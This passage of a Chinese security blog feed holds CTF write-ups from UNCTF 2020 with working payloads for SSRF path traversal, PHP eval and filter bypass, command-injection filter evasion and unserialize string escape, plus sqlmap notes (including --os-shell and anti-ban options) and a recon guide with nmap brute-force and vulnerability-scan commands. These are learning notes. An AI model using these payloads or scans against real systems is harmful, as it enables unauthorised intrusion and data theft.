class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;CSRF-Token&quot;</span>:<span class="string">&quot;e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;2deefa03-cda6-41fc-be25-a986067c7048&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;jnr3quolg5o2ohlifbdld6bku5&quot;</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    <span class="built_in">print</span>(req.text)        //result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagtxt</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;web1-flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            <span class="built_in">print</span>(a.strip())</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            result-flag(a.strip())</span><br><span class="line">            </span><br><span class="line">flagtxt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0x05-生成以指定字符为开头的md5值"><a href="#0x05-生成以指定字符为开头的md5值" class="headerlink" title="0x05 生成以指定字符为开头的md5值"></a>0x05 生成以指定字符为开头的md5值</h2><ul>
<li>百度的</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># 脚本功能：生成以指定字符为开头的md5值（x位数字）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encryption</span>(<span class="params">chars</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(chars.encode(<span class="string">&quot;utf8&quot;</span>)).hexdigest()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(random.randint(<span class="number">11111111</span>,<span class="number">99999999</span>))  <span class="comment">#爆破范围</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    start = <span class="string">&quot;66666&quot;</span>  <span class="comment">#md5指定前几位</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        strs = generate()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Test %s &quot;</span> % strs)</span><br><span class="line">        <span class="keyword">if</span> encryption(strs).startswith(start):</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;yes!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[+] %s &quot;</span> % strs + <span class="string">&quot;%s &quot;</span> % encryption(strs))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;no!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&#x27;完成！&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>结果如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yes!</span><br><span class="line">[+] 43650254 66666b9c81d0d15f983ad8963908ce10 </span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>白帽python</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap</title>
    <url>/2021/02/04/sqlmap/</url>
    <content><![CDATA[<h2 id="sqlmap的常见使用方式"><a href="#sqlmap的常见使用方式" class="headerlink" title="sqlmap的常见使用方式"></a>sqlmap的常见使用方式</h2><blockquote>
<p>需要python环境</p>
</blockquote>
<h4 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h4><p>常见指令:</p>
<ul>
<li><p><code>-u</code>               指定url</p>
</li>
<li><p><code>--dbs</code>          获得数据库</p>
</li>
<li><p><code>--tables</code>      获得表</p>
</li>
<li><p><code>--columns</code>  获得字段</p>
</li>
<li><p><code>--dump   </code>    枚举所有数据</p>
</li>
<li><p>-D 库名   -T 表名  - C 字段</p>
<span id="more"></span>
</li>
<li><p><code>--forms  </code>        让sqlmap自己寻找页面表单</p>
<p>为了防止被ban，还需下面操作</p>
</li>
<li><p><code>--count   </code>     查询数据量</p>
</li>
<li><p><code>--random-agent</code> 构造随机user-agent</p>
</li>
<li><p><code>--delay=2</code>     延迟2秒</p>
</li>
<li><p><code>--level 1-5</code>（默认为1，低等级，如果跑不出来可以加高等级）</p>
</li>
<li><p><code>--tamper  xxxxx.py</code>  调用tamper脚本</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https:xxxx.com?id&#x3D;1&quot; --dbs --count</span><br></pre></td></tr></table></figure>

<ul>
<li><p><code>--is-dba</code>          查看权限是否为root，如果显示DBA为TRUE   可以尝试直接webshell</p>
</li>
<li><p><code>--os-shell</code>   尝试拿shell</p>
</li>
<li><p><code>--batch</code>  不询问输入，全部默认确定</p>
</li>
<li><p><code>-v </code>              显示详细的输出等级（-v 3 会显示Payload）</p>
</li>
</ul>
<p>代理：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy http:&#x2F;&#x2F;192.168.1.1:xxxx</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">–proxy-file：加载代理ip列表</span><br><span class="line"></span><br><span class="line">–proxy-file&#x3D;xxx.txt</span><br></pre></td></tr></table></figure>



<p><code>--fresh-queries</code>             不会从缓存里面加载</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title>unctf2020</title>
    <url>/2020/11/15/unctf/</url>
    <content><![CDATA[<h2 id="easy-ssrf"><a href="#easy-ssrf" class="headerlink" title="easy_ssrf"></a>easy_ssrf</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">                   welc0me to <span class="number">2020</span>UNCTF!!</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span><span class="string">&#x27;&lt;center&gt;&lt;strong&gt;welc0me to 2020UNCTF!!&lt;/strong&gt;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/unctf\.com/&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/php|file|zip|bzip|zlib|base|data/i&#x27;</span>,<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="variable">$url</span>=file_get_contents(<span class="variable">$url</span>);</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&#x27;error!!&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>第一需要匹配unctf.com,第二不能匹配php|file|zip|bzip|zlib|base|data。</p>
<p>url可控，可以访问unctf.com里面的数据 从而造成ssrf。</p>
<span id="more"></span>

<hr>
<blockquote>
<p>?url=<a href="http://www.unctf.com/flag">www.unctf.com/../../../../../flag</a></p>
</blockquote>
<p><img src="/2020/11/15/unctf/1.png" alt="1"></p>
<hr>
<hr>
<p>payload2:</p>
<p><code>file_get_contents()</code>函数如果输入一个不存在的协议名，</p>
<p>例如构造<code>aaa://</code>,其中<code>aaa:/</code>会被识别成一个目录,<code>/unctf.com</code>是另一个目录,</p>
<p>后端就会读取成<code>/aaa:/unctf.com/../../../../../flag</code>就会造成目录穿越，从而造成SSRF。</p>
<blockquote>
<p>?url=aaa://unctf.com/../../../../../../flag</p>
</blockquote>
<p><img src="/2020/11/15/unctf/2.png" alt="2"></p>
<hr>
<p><a href="https://www.cnblogs.com/yesec/p/12580978.html">参考文章</a></p>
<hr>
<h2 id="babyeval"><a href="#babyeval" class="headerlink" title="babyeval"></a>babyeval</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">// flag在flag.php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\(.*\)/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">        ob_start(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">                 <span class="keyword">if</span> (strpos(<span class="variable">$data</span>, <span class="string">&#x27;flag&#x27;</span>) !== <span class="literal">false</span>)</span><br><span class="line">                 <span class="keyword">return</span> <span class="string">&#x27;ByeBye hacker&#x27;</span>;</span><br><span class="line">                 <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                 &#125;);</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<blockquote>
<p>?a=include $_GET[“zsz”] ?&gt;&amp;zsz=php://filter/read=convert.base64-encode/resource=flag.php</p>
</blockquote>
<p><img src="/2020/11/15/unctf/3.png" alt="img"></p>
<p>base64解密得：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span>=<span class="string">&#x27;FLAG&#123;581e439b-deca-4e87-a957-07d07612baa3&#125;&#x27;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h2 id="UN’s-online-tools"><a href="#UN’s-online-tools" class="headerlink" title="UN’s_online_tools"></a>UN’s_online_tools</h2><p>经典命令执行</p>
<p><img src="/2020/11/15/unctf/4.png" alt="4"></p>
<p>里面涉及很多过滤，在index.php里面</p>
<p>过滤了<code>cat</code>，所以可以用能代替<code>cat</code>的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl:显示的时候，顺便输出行号</span><br></pre></td></tr></table></figure>

<p><code>%09</code>代替空格</p>
<p><img src="/2020/11/15/unctf/5.png" alt="5"></p>
<p>查看index.php内容:</p>
<p>发现过滤内容</p>
<p><img src="/2020/11/15/unctf/8.png" alt="8"></p>
<p>style.css里面没有东西，可能flag不在这个下级目录里面</p>
<p><img src="/2020/11/15/unctf/6.png" alt="6"></p>
<p>flag被过滤了，通配符<code>?</code>来匹配</p>
<p><img src="/2020/11/15/unctf/7.png" alt="7"></p>
<p><a href="https://www.cnblogs.com/NPFS/p/13279815.html">命令执行绕过</a>    </p>
<p>感觉还是要自己总结一下，后面再总结一下吧</p>
<hr>
<h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$username</span>  = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>  = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>])? <span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]: <span class="string">&quot;&quot;</span> ;</span><br><span class="line"><span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data_unserialize</span>[<span class="string">&#x27;username&#x27;</span>]==<span class="variable">$username</span>&amp;&amp;<span class="variable">$data_unserialize</span>[<span class="string">&#x27;password&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;username or password error!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p><code>if</code>判断用的是<code>==</code>而不是<code>===</code>,利用php弱类型</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$username&#x3D;&#39;aaaaa&#39;;</span><br><span class="line">$data&#x3D;[</span><br><span class="line">    &#39;username&#39;&#x3D;&gt;true,</span><br><span class="line">    &#39;password&#39;&#x3D;&gt;true,</span><br><span class="line">];</span><br><span class="line">$p1&#x3D;serialize($data);</span><br><span class="line">echo $p1;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;b:1;s:8:&quot;password&quot;;b:1;&#125;</span><br></pre></td></tr></table></figure>

<p>POST传入即可</p>
<hr>
<p>收集总结一下php弱类型：</p>
<ul>
<li><p><code>==</code>和<code>===</code>区别：</p>
<p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
</li>
<li><p>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
</li>
<li><p>“1admin”==1 比较的时候会将1admin转化成数值,结果为1，</p>
</li>
<li><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
</li>
</ul>
<p>很多题可以用php弱类型绕过</p>
<hr>
<h2 id="easyunserialize"><a href="#easyunserialize" class="headerlink" title="easyunserialize"></a>easyunserialize</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname&#x3D;$uname;</span><br><span class="line">        $this-&gt;password&#x3D;$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">            if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;easy&#39;)</span><br><span class="line">            &#123;</span><br><span class="line">                include(&#39;flag.php&#39;);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &#39;wrong password&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;easychallenge&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname&#x3D;$_GET[1];</span><br><span class="line">$password&#x3D;1;</span><br><span class="line">$ser&#x3D;filter(serialize(new a($uname,$password)));</span><br><span class="line">$test&#x3D;unserialize($ser);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p>php反序列化+字符串逃逸</p>
<blockquote>
<p>先反序列化：</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;uname&#x3D;$uname;</span><br><span class="line">        $this-&gt;password&#x3D;$password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">            if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;easy&#39;)</span><br><span class="line">            &#123;</span><br><span class="line">                include(&#39;flag.php&#39;);</span><br><span class="line">                echo $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                echo &#39;wrong password&#39;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;easychallenge&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname&#x3D;$_GET[1];</span><br><span class="line">$password&#x3D;1;</span><br><span class="line">$ser&#x3D;serialize(new a($uname,$password));</span><br><span class="line">var_dump($ser);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>当我们传入<code>?1=test</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/11/15/unctf/10.png" alt="10"></p>
<blockquote>
<p>在逃逸构造：</p>
</blockquote>
<p>我们知道我们的uname是可控的，但是我们密码是不可控的，我要拿flag必须构造出password=’easy’</p>
<p>下面就是我们构造的关键部分</p>
<figure class="highlight plain"><figcaption><span>filter($string)&#123;</span></figcaption><table><tr><td class="code"><pre><span class="line">    function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;easychallenge&#39;,$string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当我们传入chanllenge是，chanllenge会被替换成easychallenge</p>
<p>uname每有一个changllenge,   uname长度增加4,这样我们可以通过闭合，构造password=’easy’，</p>
<p>“;s:8:”password”;s:4:”easy”;}共有29个字符，不是4的倍数后面加3个字符就行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?1&#x3D;</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa</span><br></pre></td></tr></table></figure>

<p>{s:5:”uname”;s:104:”challengechallengechallengechallengechallengechallengechallengechallenge”;s:8:”password”;s:4:”easy”;}<code>aaa&quot;;s:8:&quot;password&quot;;i:1;&#125;</code>标记的部分由于前面的执行过了，就不能执行被丢弃了</p>
<p><img src="/2020/11/15/unctf/9.png" alt="9"></p>
<p>上面这种情况是字符串变成引起的。</p>
<p>还有字符串变短也会引起字符串逃逸</p>
<p><a href="https://www.cnblogs.com/hello-there/p/12870541.html">参考文章</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>unctf2020</tag>
      </tags>
  </entry>
  <entry>
    <title>信息收集</title>
    <url>/2022/03/18/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    <content><![CDATA[<p>在线工具：</p>
<p><a href="https://hackertarget.com/">https://hackertarget.com/</a></p>
<p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p>
<h1 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h1><p>查询域名是否已经被注册，以及注册域名和注册人的详细信息</p>
<h3 id="whois查询"><a href="#whois查询" class="headerlink" title="whois查询"></a>whois查询</h3><ul>
<li>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></li>
<li>国外：       <a href="https://www.whois.com/">https://www.whois.com/</a></li>
<li>腾讯云：  <a href="https://whois.cloud.tencent.com/domain?domain=">https://whois.cloud.tencent.com/domain?domain=</a></li>
</ul>
<span id="more"></span>

<h3 id="备案信息查询"><a href="#备案信息查询" class="headerlink" title="备案信息查询"></a>备案信息查询</h3><ul>
<li><a href="https://www.sec.gov/edgar/searchedgar/companysearch.html">美国企业备案查询</a></li>
<li><a href="http://www.beianbeian.com/">ICP备案查询网</a></li>
<li><a href="http://www.beian.miit.gov.cn/publish/query/indexFirst.action">工业和信息化部ICP/IP/域名信息备案管理</a></li>
</ul>
<h3 id="信用信息查询"><a href="#信用信息查询" class="headerlink" title="信用信息查询"></a>信用信息查询</h3><ul>
<li><p><a href="http://www.gsxt.gov.cn/index.html">国家企业信用信息公示系统</a></p>
</li>
<li><p><a href="http://company.xizhi.com/">悉知-全国企业信息查询</a></p>
</li>
<li><p><a href="https://www.creditchina.gov.cn/">信用中国-个人信用查询搜索-企业信息查询搜索-统一社会信用代码查询</a></p>
</li>
</ul>
<h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>myip.ms</p>
<p>TCPIPUTILS</p>
<p>DNSlytics</p>
<p>个人暂时没有用过</p>
<h3 id="应用信息"><a href="#应用信息" class="headerlink" title="应用信息"></a>应用信息</h3><p><a href="https://www.tianyancha.com/">天眼查-商业安全工具</a></p>
<hr>
<h1 id="反查（ip-域名）"><a href="#反查（ip-域名）" class="headerlink" title="反查（ip/域名）"></a>反查（ip/域名）</h1><h3 id="Dnslytics"><a href="#Dnslytics" class="headerlink" title="Dnslytics"></a>Dnslytics</h3><p><a href="https://dnslytics.com/">https://dnslytics.com/</a></p>
<hr>
<h1 id="子域名收集"><a href="#子域名收集" class="headerlink" title="子域名收集"></a>子域名收集</h1><h3 id="在线工具"><a href="#在线工具" class="headerlink" title="在线工具"></a>在线工具</h3><ul>
<li><a href="http://tool.chinaz.com/subdomain/?domain=">站长工具</a></li>
<li><a href="https://hackertarget.com/find-dns-host-records/">hackertarget</a></li>
<li><a href="https://phpinfo.me/domain/">phpinfo</a></li>
<li><a href="https://www.t1h2ua.cn/tools/">t1h2ua</a></li>
<li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
<li><a href="https://d.chinacycc.com/">chinacycc</a></li>
<li><a href="http://z.zcjun.com/">zcjun</a></li>
</ul>
<p>phpinfo  还行</p>
<h3 id="枚举工具"><a href="#枚举工具" class="headerlink" title="枚举工具"></a>枚举工具</h3><p><a href="https://github.com/shmilylty/OneForAll">OneForAll</a></p>
<p>Layer</p>
<h3 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h3><p>google hack ：site:xxx</p>
<p>FOFA，hunter等（domain:xxxxx）</p>
<hr>
<h1 id="域名对应ip"><a href="#域名对应ip" class="headerlink" title="域名对应ip"></a>域名对应ip</h1><h3 id="判断是否有CDN"><a href="#判断是否有CDN" class="headerlink" title="判断是否有CDN"></a>判断是否有CDN</h3><ol>
<li>多地ping，查看ip是否改变</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;ping.chinaz.com&#x2F;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>Nslookup    通过不用DNS解析目标域名，  结果不一样可能存在CDN</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nslookup www.dfle.com.cn 8.8.8.8</span><br><span class="line">nslookup www.dfle.com.cn 114.114.114.114</span><br><span class="line">nslookup www.dfle.com.cn                       Nslookup    默认解析</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>利用工具检测</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cdnplanet        https:&#x2F;&#x2F;www.cdnplanet.com&#x2F;tools&#x2F;cdnfinder&#x2F;</span><br></pre></td></tr></table></figure>



<h3 id="绕过CND查真实ip查询"><a href="#绕过CND查真实ip查询" class="headerlink" title="绕过CND查真实ip查询"></a>绕过CND查真实ip查询</h3><ol>
<li>目标邮件服务器一般没有CDN</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">目标网站的邮箱注册、找回密码或者RSS订阅</span><br><span class="line">功能，查看邮件、寻找邮件头中的邮件服务器域名IP，ping这个邮件服务器的域名,</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>国外ping</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tools.ipip.net&#x2F;newping.php</span><br><span class="line">https:&#x2F;&#x2F;asm.ca.com&#x2F;en&#x2F;ping.php</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>国外DNS解析</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.ab173.com&#x2F;dns&#x2F;dns_world.php</span><br><span class="line">nslookup    www.xxx.com   *.*.*.*</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>一般主域名没有什么功能，不会添加CND，对应子域可能会添加CDN。</li>
</ol>
<p>有可能子域ip和和主域名ip一样，或者在一个c端。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;phpinfo.me&#x2F;bing.php</span><br></pre></td></tr></table></figure>







<ol>
<li>国外请求</li>
</ol>
<h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><p>shodan:     <a href="https://www.shodan.io/">https://www.shodan.io/</a></p>
<p>zoomeye：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p>
<p>fafa:            <a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p>
<p>hunter:       <a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p>
<ol>
<li>(结合脚本，进行批量) </li>
<li>能够快速发现目标网站的一些服务</li>
</ol>
<hr>
<h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><h3 id="扫描工具"><a href="#扫描工具" class="headerlink" title="扫描工具"></a>扫描工具</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Nmap      可以细扫端口和漏洞</span><br><span class="line"></span><br><span class="line">nmap -T4 -A -v -Pn </span><br><span class="line"></span><br><span class="line">（扫描端口并且标记可以爆破的服务）</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;ftp-brute,imap-brute,smtp-brute,pop3-brute,mongodb-brute,redis-brute,ms-sql-brute,rlogin-brute,rsync-brute,mysql-brute,pgsql-brute,oracle-sid-brute,oracle-brute,rtsp-url-brute,snmp-brute,svn-brute,telnet-brute,vnc-brute,xmpp-brute </span><br><span class="line"></span><br><span class="line">判断常见的漏洞并扫描端口</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;auth,vuln</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">精确判断漏洞并扫描端口</span><br><span class="line">nmap 127.0.0.1 --script&#x3D;dns-zone-transfer,ftp-anon,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,http-backup-finder,http-cisco-anyconnect,http-iis-short-name-brute,http-put,http-php-version,http-shellshock,http-robots.txt,http-svn-enum,http-webdav-scan,iis-buffer-overflow,iax2-version,memcached-info,mongodb-info,msrpc-enum,ms-sql-info,mysql-info,nrpe-enum,pptp-version,redis-info,rpcinfo,samba-vuln-cve-2012-1182,smb-vuln-ms08-067,smb-vuln-ms17-010,snmp-info,sshv1,xmpp-info,tftp-enum,teamspeak2-version</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/nmap/nmap">https://github.com/nmap/nmap</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Masscan   主要全端口扫描</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p>
<p>masscan+nmap</p>
<p>全端口+服务探测 （copy的）</p>
